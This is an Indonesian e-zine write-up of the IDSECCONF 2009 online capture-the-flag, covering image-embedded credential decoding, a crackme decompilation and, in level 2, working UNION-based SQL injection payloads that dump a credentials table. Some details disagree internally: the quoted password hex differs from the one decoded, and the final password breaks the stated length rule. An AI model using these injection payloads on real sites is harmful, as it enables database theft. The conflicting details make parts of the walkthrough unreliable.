@@ -1,0 +1,604 @@
+                     _|                            _|                      
+   _|_|      _|_|_|  _|_|_|      _|_|    _|_|_|_|      _|_|_|      _|_|    
+ _|_|_|_|  _|        _|    _|  _|    _|      _|    _|  _|    _|  _|_|_|_|  
+ _|        _|        _|    _|  _|    _|    _|      _|  _|    _|  _|        
+   _|_|_|    _|_|_|  _|    _|    _|_|    _|_|_|_|  _|  _|    _|    _|_|_|  
+
+ECHO MAGAZINE VOLUME VIII, ISSUE XXII, PHILE 0x007.TXT
+
+CTF ONLINE IDSECCONF 2009; Apa dan Bagaimana - the_day
+the_day/at/echo/dot/or/dot/id
+  
+---[ Pendahuluan  
+
+Masih ingat dengan acara IDSECCONF kedua yang di adakan pada bulan Oktober
+2009 ??  Sebelum diadakan acara tersebut komite IDSECCONF membuat sebuah
+game CTF (Capture the Flag) yang tujuan nya untuk menyari 10 peserta
+terbaik dan akan mendapatkan tiket masuk gratis pada acara IDSECCONF 2009.
+
+Pada Materi ini saya akan mencoba membahas tentang apa dan bagaimana cara
+menyeselesaikan level-level yang ada pada CTF Online IDSECCONF 2009.
+
+---[ APA  
+
+Dalam CTF Online IDSECCONF 2009 terdapat 3 level tantangan , dan di
+harapkan dapat menambah wawasan para peserta , karena bukan hanya Web
+Hacking yang sudah biasa dilakukan tetapi ada yang lain dari itu.  Adapun
+level-level tersebut terdiri dari :
+
+*) Level 1 : Simple Reverse Engineering
+*) Level 2 : Web Hacking 
+*) Level 3 : Medium Reverse Engineering 
+
+Inti dari dari semua level adalah untuk mendapatkan username & password
+yang akan digunakan naik ke level selanjutnya. Username & Password yang
+sudah di dapatkan oleh salah satu peserta akan di disable secara
+otomatis,sehingga tidak memungkinkan satu username&password digunakan oleh
+dua peserta. Disini juga setiap gambar atau file yang sudah berhasil
+didapatkan username & password nya akan otomatis diganti dengan gambar atau
+file lain nya.  
+
+Saya akan coba bahas satu persatu dalam tulisan ini.
+
+
+---[ Level 1 : Simple Reverse Engineering  
+
+Pada level 1 ini peserta akan diberikan misi mencari username&password
+untuk dapat digunakan masuk ke level 2.  Username & Password akan terdapat
+pada link http://ctf.idsecconf.org .  Mungkin banyak yang bertanya-tanya
+dari mana mendapatkan username & password , karena yang muncul di url
+tersebut hanya sebuah gambar .  
+
+Jawabannya singkat: username & password kami sisipkan pada gambar tersebut.
+
+Berikut bagaimana cara menyelesaikan nya :
+
+1) Simpan gambar yang muncul pada url http://ctf.idsecconf.org
+   contoh : idsecconf.jpg
+  
+2) Buka isi file idsecconf.jpg
+--
+$cat idsecconf.jpg
+--
+++Note : - Karena sebuah file gambar jika di lihat isinya maka akan banyak
+karakter-karakter aneh, maka carilah sebuah karakter yang bisa anda baca
+terhadap hasil file tersebut.  Disini User dan Password
+  
+$cat idsecconf.jpg
+--
+Username :TURFeE1URXdNREF3TVRBd01EQXhNVEF4TURBd01URXdNREV3TVRFd01EQXdNVEV4TURBd01BPT0=
+Password:4e7a597a4e6a5a6c4e7a6b324e7a59304d7a6b3d
+--
+Username & Password semuanya dalam bentuk encode jadi dibutuhkan decode
+agar bisa digunakan, disinilah salah satu tantangan bagi peserta untuk
+dapat memecahkan jenis encoding yang digunakan.
+
+3) Mencari jenis encoding username 
+
+Username : TURFeE1URXdNREF3TVRBd01EQXhNVEF4TURBd01URXdNREV3TVRFd01EQXdNVEV4TURBd01BPT0=
+
+Jika di lihat sekilas dari username tersebut merupakan hasil encoding
+menggunakan base64, dilihat dengan adanya karakter pada "=" di akhir sebuah
+kata [1].
+
+a) Mari kita coba decode menggunakan base64 decode 
+  
+>>> import base64
+>>> decode1 = base64.b64decode('TURFeE1URXdNREF3TVRBd01EQXhNVEF4TURBd01URXdNREV3TVRFd01EQXdNVEV4TURBd01BPT0=')
+>>> decode1
+'MDExMTEwMDAwMTAwMDAxMTAxMDAwMTEwMDEwMTEwMDAwMTExMDAwMA=='
+
+Hasilnya ternyata masih dalam bentuk encode
+"MDExMTEwMDAwMTAwMDAxMTAxMDAwMTEwMDEwMTEwMDAwMTExMDAwMA==" dan masuk dalam
+bentuk base64.
+
+>>> decode2 = base64.b64decode('MDExMTEwMDAwMTAwMDAxMTAxMDAwMTEwMDEwMTEwMDAwMTExMDAwMA==')
+>>> decode2
+'0111100001000011010001100101100001110000'
+
+Hasil dari decode2 ternyata dalam bentuk binary,dengan nilai
+"0111100001000011010001100101100001110000"  .sekarang kita  lakukan convert 
+binary ke  ASCII . 
+
+b) convert binary ke ASCII
+
++-- [bin2asc.php]
+|		
+| #!/usr/bin/php
+| <?php
+| function bin2asc ($binary)
+|   {
+|    $i = 0;
+|    while ( strlen($binary) > 3 )
+|        {
+|         $byte[$i] = substr($binary, 0, 8);
+|         $byte[$i] = base_convert($byte[$i], 2, 10);
+|         $byte[$i] = chr($byte[$i]);
+|         $binary = substr($binary, 8);
+|         $ascii = "$ascii$byte[$i]";
+|        }
+|    return $ascii;
+|    }
+| $result=bin2asc($argv[1]);
+| fwrite(STDOUT,"Result : $result \n");
+| ?>
++------------
+		
+
+$php bin2asc.php 0111100001000011010001100101100001110000
+Result : xCFXp
+		
+username sudah di dapatkan yaitu : xCFXp
+Jadi algoritma username adalah ascii--binary--base64--base64 untuk
+melakukan encoding gunakan base64 decode--base64 decode--binary--ascii
+
+4) Mencari jenis encoding password
+		
+Password : 4e7a6b30595463334d7a4d325a4451794e47553d
+
+Jenis password ini menggunakan HEXA Decimal. 
+a) Convert HEXA Decimal ke ASCII (1)
+		
+>>> import binascii
+>>> binascii.a2b_hex('4e7a6b30595463334d7a4d325a4451794e47553d')
+'Nzk0YTc3MzM2ZDQyNGU='
+	 
+b) Convert Base64 ke ASCII (2)
+		
+>>> import base64
+>>> base64.b64decode('Nzk0YTc3MzM2ZDQyNGU=')
+'794a77336d424e'
+
+c) Convert HEXA ke ASCII (3)
+		
+>>> import binascii
+>>> binascii.a2b_hex('794a77336d424e')
+'yJw3mBN'
+
+Password sudah di dapatkan yaitu : yJw3mBN Jadi algoritma Password adalah
+ascii--hex--base64--hex untuk melakukan encoding gunakan hexa-ascii--base64
+decode--hexa--ascii
+
+#Berikut peserta yang lolos pada level 1 ini :
+
+pl4y312, Im_stupid, ontaku, kendi, kaitou, npc, baliwae, bofh, nganggur,
+radiaku, ori0n32, nobita, sj, 3xtr3m3b0y, Th0R, doraemon, ngetest, budi,
+Matdhule, pr4ka5a, 15ki, s1k4tr0, anvie, mardongan, opt, Vladislas, bolos!,
+doevhiey, xnuxer 
+
+---[ Level 2 : Web Hacking (SQL Injection)  
+
+Pada Level 2 ini misi nya juga sama mencari username&password tetapi dengan
+menggunakan sebuah website yang mempunyai kelemahan pada Query SQL nya.
+
+Website tersebut http://ctf.idsecconf.org/level2/
+
+Langsung saja karena saya anggap untuk sql injection ini mudah untuk di
+lakukan, jadi saya akan membahas algoritma username&password yang
+digunakan.  Dilevel 2 ini saya juga membuat agar username&password yang
+sudah digunakan tidak bisa lagi digunakan dan akan di ganti secara
+otomatis.
+
+Sedangkan Langkah untuk mendapatkan username&password adalah :
+	
+1) Mencari apakah page tersebut mempunyai kelemahan SQL Injection
+		
+http://ctf.idsecconf.org/level2/index.php?news=3 order by  55
+
+2)  Mencari informasi table schema
+		
+ http://ctf.idsecconf.org/level2/index.php?news=-3 union select\ 
+ 1,table_name,3,4,5 from information_schema.tables
+
+3)  Mencari Informasi table field
+		
+ http://ctf.idsecconf.org/level2/index.php?news=-3 union select\
+ 1,group_concat(column_name),3,4,5 from information_schema.columns\ 
+ where table_name='ctf_auth_level2'
+
+4) Mencari Informasi table ctf_auth_level2
+		
+ http://ctf.idsecconf.org/level2/index.php?news=-3 union select 1,\
+ concat(id,0x3a,username,0x3a,password),3,4,5 from ctf_auth_level2
+		
+Password pada Level 2 hanya menggunakan base64 jadi bisa dengan mudah di
+encode
+
+
+Berikut peserta yang lolos pada level 2 ini :
+
+kendi, ontaku, pl4y312, Im_stupid, npc, radiaku, ori0n32, nganggur, bofh,
+ngetest, baliwae, 3xtr3m3b0y, Matdhule, budi, 15ki, s1k4tr0, anvie,
+mardongan, opt, bolos!, doevhiey, xnuxer 
+		
+---[ Level 3 : Medium Reverse Engineering
+
+Level 3 ini adalah level terakhir pada CTF ONLINE IDSECCONF 2009 dan
+peserta yang lolos level 2 akan diberikan sebuah file yang sudah di compile
+dan di harusnya mendapatkan password dan userid pada file tersebut.  Disini
+saya akan menggunakan boomerang [2] untuk melakukan decompile.
+
+Berikut langkah pencarian userid dan password :
+	
+*)file bl00dyh0l1d4y
+
+1) Coba Jalankan file binary tersebut:		
+
+ $./bl00dyh0l1d4y 
+ bash: Permission denied
+
+Kenapa Permission denied ???
+		
+ $ls -l bl00dyh0l1d4y
+ -rwxr-xr-x 1 theday theday 7832 2009-10-29 21:58 bl00dyh0l1d4y
+ 
+ $id
+ uid=1000(theday) gid=1000(theday) groups=20(dialout), 24(cdrom),
+ 25(floppy), 29(audio), 44(video), 46(plugdev), 103(scanner), 110(netdev),
+ 115(powerdev), 1000(theday) 
+
+Disini kita akan mencari penyebab kenapa file tersebut menampilkan
+permission denied ketika di jalankan.  
+
+2)Decompile file bl00dyh0l1d4y 
+		
+$./boomerang ../src/bl00dyh0l1d4y
+ Boomerang alpha 0.3 13/June/2006
+ setting up transformers...
+ loading...
+ Warning: dynamic symbol table hack used!
+ decoding entry point...
+ decoding anything undecoded...
+ finishing decode...
+ found 6 procs
+ decompiling...
+ decompiling entry point main
+ considering main
+ considering glibc_uid
+ decompiling glibc_uid
+ considering glibc_core2
+ considering simple_permutate
+ decompiling simple_permutate
+ considering glibc_goto
+ decompiling glibc_goto
+ considering glibc_error
+ decompiling glibc_error
+ decompiling glibc_core2
+ decompiling main
+ generating code...
+ output written to ./output/bl00dyh0l1d4y
+ completed in 1 sec.
+
+ Output hasil decompile bernama /output/bl00dyh0l1d4y/bl00dyh0l1d4y.c
+
+3) Analisa Source Code :
+
++--file bl00dyh0l1d4y.c
+| int stdin;
+| int glibc_u;
+|
+| glibc_uid(int param1);
+| glibc_core2(int param3, int param1, int param2);
+| glibc_goto();
+| simple_permutate(int param1);
+| glibc_error(int param1);
+|
+| // address: 0x80486f7
+| int main(int argc, char **argv, char **envp) {
+| int local4; 		// r27
+| int local5; 		// r28
+| int local6; 		// r29
+| int local7; 		// r31
+|
+| *(int*)(local5 - 4) = *(int*)local5;
+| *(int*)(local5 - 8) = local6;
+| *(int*)(local5 - 12) = local5 + 4;
+| local6 = glibc_uid(local5 - 8);
+| local4 = glibc_core2(local4, local6, local7); /* Warning: also results in local7 */
+| return 0;
+| }
+|
+| // address: 0x80486c1
+| glibc_uid(int param1) {
+| 	int local2; 		// r29{3}
+| 	int local3; 		// r29{37}
+| 	int local4; 		// r24
+| 	int local7; 		// r28
+|
+| 	 *(int*)(local7 - 4) = param1;
+| 	local2 = local7 - 4;
+| 	getuid();
+| 	local3 = local2;
+| 	glibc_u = local4;
+| 	if (local4 == 0x2177) {
+| 		local3 = param1;
+| 	 } else {
+| *(int*)(local7 - 12) = 0x804887f;
+| 	 puts("bash: Permission denied");
+| *(int*)(local7 - 12) = 1;
+| exit(1);
+| 	}
+| 	param1 = local3;
+| 	return param1;
+| }
+|
+| // address: 0x80485d9
+| glibc_core2(int param3, int param1, int param2) {
+| 	int local1; 		// r28{102}
+| 	int local12; 		// m[r29 - 12]{111}
+| 	int local13; 		// r28{186}
+| 	int local14; 		// %pc{188}
+| 	int local15; 		// r28{194}
+| 	int local16; 		// %pc{199}
+| 	int local17; 		// r8
+| 	int local18; 		// r24
+| 	int local19; 		// r25
+| 	int local2; 		// %pc{101}
+| 	int local20; 		// r26
+| 	int local21; 		// r28
+| 	int local3; 		// r24{87}
+| 	int local4; 		// m[r28]{98}
+| 	int local6; 		// m[r28]{83}
+| 	int local7; 		// r28{41}
+| 	int local9; 		// %pc{40}
+|
+| 	 *(int*)(local21 - 4) = param1;
+| 	param1 = local21 - 4;
+| 	*(int*)(local21 - 8) = param2;
+| 	*(int*)(local21 - 12) = param3;
+| 	*(int*)(local21 - 24) = 50;
+| 	*(int*)(local21 - 60) = 0x8048863;
+| 	printf("Enter the Password br0th4: ");
+| 	 *(int*)(local21 - 60) = 51;
+| 	local18 = malloc(51);
+| 	*(int*)(local21 - 20) = local18;
+| 	*(int*)(local21 - 52) = stdin;
+| 	*(int*)(local21 - 56) = local21 - 24;
+| 	*(int*)(local21 - 60) = local21 - 20;
+| 	 getline();
+| 	local15 = local7;
+| 	local16 = local9;
+| 	local19 = -1;
+| 	*(int*)(local21 - 32) = local18;
+| 	param2 = local18;
+| 	do {
+| 	  if (local19 == 0) {
+| 	 goto L14;
+| 	 }
+| 		 param4 = 0 - *(int*)param2;
+| 	param2++;
+| 	local19 = local19 - 1;
+| 	} while (CF);
+| 	L14:
+| 	local17 = (unsigned char) local19 - 1;
+| 	 if ((unsigned)(local19 - 1) > 24) {
+| *(int*)(local21 - 16) = 0;
+| 	 for(;;) {
+| local21 = local15;
+| local19 = -1;
+| *(int*)(param1 - 32) = *(int*)(param1 - 16);
+| param2 = *(int*)(param1 - 16);
+| do {
+| 		if (local19 == 0) {
+|  		goto L8;
+| 		}
+| 		param4 = 0 - *(int*)param2;
+| 		param2++;
+| 		local19 = local19 - 1;
+|  } while (CF);
+| 
+| L8:
+| local17 = (unsigned char) local19 - 2;
+| if ((unsigned)*(int*)(param1 - 12) >= (unsigned)(local19 - 2)) {
+| 	local20 = glibc_goto();
+| 	param3 = *(int*)(local21 + 48);
+| 	param2 = *(int*)(local21 + 52);
+|  	}
+|	local18 = (int) (unsigned char) *(int*)(param1 - 12) + 1;
+|	local6 = local18;
+|	local3 = simple_permutate(*(int*)local21);
+| 	local18 = *(unsigned char*)(*(int*)(param1 - 16) + *(int*)(param1 - 12));
+|	local4 = (int) (unsigned char) local18;
+|	local18 = simple_permutate(*(int*)local21); /* Warning: also results in local1 */
+|	local13 = local1;
+|	local14 = local2;
+|	if (local3 != local18) {
+| 	        param1 = glibc_error(param1);
+|		 local13 = local21;
+| 		 }
+|		local21 = local13;
+|		local12 = *(int*)(param1 - 12) + 1;
+|		local15 = local21;
+|  		}
+| } else {
+|  		*(int*)(local21 - 60) = 1;
+|  		exit(1);
+| }
+| return local17; /* WARNING: Also returning: local20, param3, param2 */
+| }
+|
+| // address: 0x8048596
+| glibc_goto() {
+|  	int local5; 		// r26
+|
+|  	puts("Congratz you finish the mission :P!");
+|  	return local5;
+| 	}
+|
+| // address: 0x80485aa
+| simple_permutate(int param1) {
+|  int local2; 		// m[r28 - 12]
+|  int local3; 		// r24
+|  int local4; 		// r28
+|
+| local3 = ((unsigned char) param1);
+| local3 = ((unsigned char) local3) & 0x1;
+| if (local3 != 0) {
+| 	 local2 = 1;
+|  } else {
+| local2 = 2;
+|  }
+| return local2;
+| }
+|
+| // address: 0x8048578
+| glibc_error(int param1) {
+|   int local5; 		// r28
+|	
+|  *(int*)(local5 - 4) = param1;
+|  *(int*)(local5 - 12) = 0x804884c;
+|  puts("wr0ng Password br0th4!");
+|  *(int*)(local5 - 12) = 1;
+|  exit(1);
+| return local5 - 4;
+| }
+|
++------EOF bl00dyh0l1d4y.c
+
+3) Analisa 1 [Mencari Userid]:
+ 
+ *)Lihat Fungsi Main
+
+ akan menjalankan pengecekan fungsi glibc_uid()
+ 		
+ local6 = glibc_uid(local5 - 8);
+
+ *)Lihat Fungsi glibc_uid()
+
+Pada fungsi ini terdapat pengecekan userid getuid() dan masuk kedalam
+string glibc_u sebagai local4
+
++--------
+|  getuid();
+|  local3 = local2;
+|  glibc_u = local4;
++--------	
+
+Terlihat juga apabila userid yang menjalankan tidak sama maka akan muncul
+pesan error "permission denied"| 		
+
++----------
+| if (local4 == 0x2177) {
+|         local3 = param1;
+|  } else {
+|         *(int*)(local7 - 12) = 0x804887f;
+|          puts("bash: Permission denied");
+| 	   *(int*)(local7 - 12) = 1;
+| 	   exit(1);
+| 	   }
++----------
+
+Disini nilai userid yang dinyatakan benar mempunyai nilai 0x2177 (hexa)
+jika di convert ke decimal menjadi 8567 , jadi userid yang bisa menjalankan
+harus mempunyai uid 8567
+
+4) Menjalankan file dengan menggunakan uid 8567
+  
+  $id 
+  uid=8567(theday) gid=1000(theday) ...
+  $./bl00dyh0l1d4y 
+  Enter the Password br0th4:
+	
+5) Analisa 2 [Mencari Password]:
+		
+Pada fungsi main jika pada fungsi glibc_uid() tidak ada error maka akan di
+lanjutkan menjalankan fungsi glibc_core2()
+ 
++----------
+| local6 = glibc_uid(local5 - 8);
+| local4 = glibc_core2(local4, local6, local7); 	
++----------|
+
+----- Fungsi glibc_core2()
+
+Pada fungsi ini jika di lihat terdapat beberapa kondisi untuk mengecek
+password yang di input oleh user dan juga masuk kedalam fungsi permutasi
+simple_permutate()
+
+Berikut kondisi-kondisi untuk password :
+
+*) Password dalam bentuk integer/angka
+*) Password tidak lebih dari 50 karakter dan lebih dari 25 character
+
++------------
+| if ((unsigned)(local19 - 1) > 24) {
+| *(int*)(local21 - 16) = 0;
+| for(;;) {
+|         local21 = local15;
+|         local19 = -1;
+|         *(int*)(param1 - 32) = *(int*)(param1 - 16);
+|         param2 = *(int*)(param1 - 16);
+|         do {
+|           if (local19 == 0) {
+|                 goto L8;
+|           }
++-------------| 	
+
+*) Angka pertama  dimulai dari angka ganjil lihat pada fungsi simple_permutate()
+*) Jenis permutasi password dengan urutan gajil genap
+ 		
++--------------
+| local3 = simple_permutate(*(int*)local21);
+| local18 = simple_permutate(*(int*)local21); /* Warning: also results in local1 */
+|      if (local3 != local18) {
+|                param1 = glibc_error(param1);
+| 		 local13 = local21;
+| 		 }
+|                local21 = local13;
+|                local12 = *(int*)(param1 - 12) + 1;
+|                local15 = local21;
+| }
+| 		} else {
+| 	*(int*)(local21 - 60) = 1;
+| 	exit(1);
+| 		}
++--------------
+
+-------- Fungsi simple_permutate()
+
+Fungsi ini untuk menentukan kombinasi urutan password.
+ 	
++----------------
+| local3 = ((unsigned char) local3) & 0x1;
+| if (local3 != 0) {
+| local2 = 1;
+|  } else {
+| local2 = 2;
+|  }
+| return local2;
+| }
++-----------------
+
+Jadi untuk kombinasi password di dapatkan angka pertama diharuskan angka
+ganjil,sehingga urutan nya menjadi ganjil genap sebanyak lebih dari 25 kali urutan.
+
+6) Memasukan Password :
+
+ $./bl00dyh0l1d4y 		
+ Enter the Password br0th4: 345678901234567890123456
+ Congratz you finish the mission :P!
+ --
+		
+# Berikut peserta yang lolos pada level 3 ini :
+
+ontaku,kendi,npc,radiaku,nganggur,Matdhule,anvie,budi,mardongan,baliwae,bofh,doevhiey
+
+	
+---[ Penutup
+
+Seperti di ketahui dari 312 peserta yang mengikuti CTF ONLINE IDSECCONF
+2009 ini hanya 12 peserta yang berhasil selesai sampai level 3.  Kami dari
+ECHO berencana untuk membuat kembali CTF ONLINE yang lebih menarik , so di
+tunggu saja kehadiran nya.  Mohon maaf apabila ada kesalahan dalam
+penulisan nya, kritik dan saran silakan disampaikan melalui email.
+ 
+---[ Referensi	
+[1] http://www.ietf.org/rfc/rfc2045.txt
+[2] http://boomerang.sourceforge.net/
+		
+---[ Thank's To
+[1] ECHO Staff
+[2] Committee IDSECCONF 
+[3] Cyberheb
+[4] ECHO Members
+
